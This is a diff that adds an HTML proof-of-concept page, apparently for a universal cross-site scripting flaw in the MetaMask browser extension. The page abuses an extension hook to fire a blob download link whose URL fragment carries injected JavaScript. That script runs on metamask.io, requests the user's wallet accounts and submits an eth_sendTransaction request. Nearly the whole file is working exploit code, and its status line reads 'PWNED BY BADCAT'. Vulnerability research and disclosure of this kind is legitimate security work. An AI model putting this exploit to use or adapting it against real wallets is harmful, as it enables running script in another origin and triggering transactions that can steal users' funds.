@@ -1,0 +1,95 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>MetaMask UXSS PoC</title>
+<p id="status">Waiting for MetaMask hook...</p>
+
+<script>
+const TARGET = 'https://metamask.io/';
+const SPIN_MS = 2000;
+
+function exploit() {
+  const payload =
+    "');function/**/downloadBlob(){};" +
+    "function/**/txError(e){" +
+      "if(e&&e.code===-32002){" +
+        "alert('TX_ERROR[-32002]:REQUEST_ALREADY_PENDING_CLOSE_EXISTING_PROMPT');" +
+      "}else{" +
+        "alert('TX_ERROR['+(e&&e.code!==undefined?e.code:'n/a')+']:'+(e&&e.message?e.message:String(e))+':DATA='+(e&&e.data?JSON.stringify(e.data):'none'));" +
+      "}" +
+    "};" +
+    "function/**/sendTx(f){" +
+      "alert('TX_REQUEST:0_ETH_to_self:data=0x');" +
+      "__txRequest=__uxssProvider.request({" +
+        "method:'eth_sendTransaction'," +
+        "params:[{from:f,to:f,value:'0x0',data:'0x'}]" +
+      "});" +
+      "document.open();" +
+      "document.write('test');" +
+      "document.close();" +
+      "__txRequest.then(function(h){alert('TX_SUBMITTED:'+h)}).catch(txError);" +
+    "};" +
+    "function/**/scheduleTx(a,d){" +
+      "__txFrom=a[0]&&a[0].address?a[0].address:a[0];" +
+      "__uxssProvider.request({method:'eth_chainId'}).then(function(c){" +
+        "alert('ACCOUNT_READY:'+__txFrom+':LEN='+String(__txFrom).length+':CHAIN='+c);" +
+        "setTimeout(function(){sendTx(String(__txFrom))},d);" +
+      "}).catch(txError);" +
+    "};" +
+    "function/**/txProbe(n){" +
+      "if(window.ethereum&&window.ethereum.request){" +
+        "__uxssProvider=window.ethereum;" +
+        "__uxssProvider.request({method:'eth_accounts'}).then(function(a){" +
+          "if(a&&a[0]){" +
+            "scheduleTx(a,750);" +
+          "}else{" +
+            "alert('ACCOUNT_PERMISSION_REQUIRED');" +
+            "__uxssProvider.request({method:'eth_requestAccounts'}).then(function(a){" +
+              "if(!a||!a[0]){alert('TX_ERROR:NO_AUTHORIZED_ACCOUNT');return}" +
+              "alert('ACCOUNT_CONNECTED');" +
+              "scheduleTx(a,2000);" +
+            "}).catch(txError);" +
+          "}" +
+        "}).catch(txError);" +
+      "}else{" +
+        "if(n){" +
+          "setTimeout(function(){txProbe(n-1)},100);" +
+        "}else{" +
+          "alert('TX_ERROR:METAMASK_PROVIDER_UNAVAILABLE');" +
+        "}" +
+      "}" +
+    "};" +
+    "if(location.origin==='https://metamask.io'){" +
+      "stop();" +
+      "alert('UXSS:'+location.origin+':top='+(top===self));" +
+      "setTimeout(function(){txProbe(100)},250)" +
+    "};void('";
+
+  const blob = new Blob(['x'], {type: 'application/octet-stream'});
+  const link = document.createElement('a');
+  link.href = URL.createObjectURL(blob) + '#' + payload;
+  link.download = 'poc.bin';
+
+  const host = document.createElement('div');
+  host.attachShadow({mode: 'closed'}).append(link);
+  document.body.append(host);
+
+  location.replace(TARGET);
+
+  const until = performance.now() + SPIN_MS;
+  while (performance.now() < until) {}
+
+  window.__mmNativeAnchorClick.call(link);
+}
+
+const deadline = performance.now() + 20000;
+(function waitForHook() {
+  if (typeof window.__mmNativeAnchorClick === 'function') {
+    document.querySelector('#status').textContent = 'PWNED BY BADCAT';
+    setTimeout(exploit, 250);
+  } else if (performance.now() < deadline) {
+    setTimeout(waitForHook, 100);
+  } else {
+    document.querySelector('#status').textContent = 'MetaMask hook not found';
+  }
+})();
+</script>
